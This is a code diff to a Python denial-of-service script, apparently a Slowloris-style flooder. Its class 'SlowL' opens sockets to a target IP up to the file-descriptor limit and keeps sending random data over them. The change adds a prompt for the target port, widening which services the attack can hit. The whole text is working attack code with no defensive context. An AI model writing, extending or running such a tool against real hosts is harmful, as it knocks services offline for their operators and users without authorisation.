@@ -7,7 +7,7 @@ import subprocess
 class SlowL:
 	def __init__(self, ip, port, maxt):
 		self.ip = socket.gethostbyname(ip)
-		self.port = port
+		self.port = int(port)
 		self.open = 0
 		while True:
 			if self.open < maxt:
@@ -27,7 +27,7 @@ class SlowL:
 			return
 		while True:
 			try:
-				sock.sendall(bytes(str(random.randint(1000000000, 99999999999)), "utf-8"))
+				sock.send(bytes(str(random.randint(1, 100000000000000000)), "utf-8"))
 				sock.recv(1024)
 			except:
 				sock.close()
@@ -39,11 +39,13 @@ if __name__ == '__main__':
 		print("Python version 2.x")
 		print("Set ulimit -n to 2000")
 		ips = raw_input("IP NOW: ")
+		pps = raw_input("PORT TARGET: ")
 		mat = int(subprocess.check_output(["ulimit", "-n"]))
-		s = SlowL(ips, 80, mat)
+		s = SlowL(ips, pps, mat)
 	else:
 		print("Python version 3.x")
 		print("Set ulimit -n to 2000")
 		ips = input("IP NOW: ")
+		pps = input("PORT TARGET: ")
 		mat = int(subprocess.check_output(["ulimit", "-n"]))
-		s = SlowL(ips, 80, mat)
+		s = SlowL(ips, pps, mat)
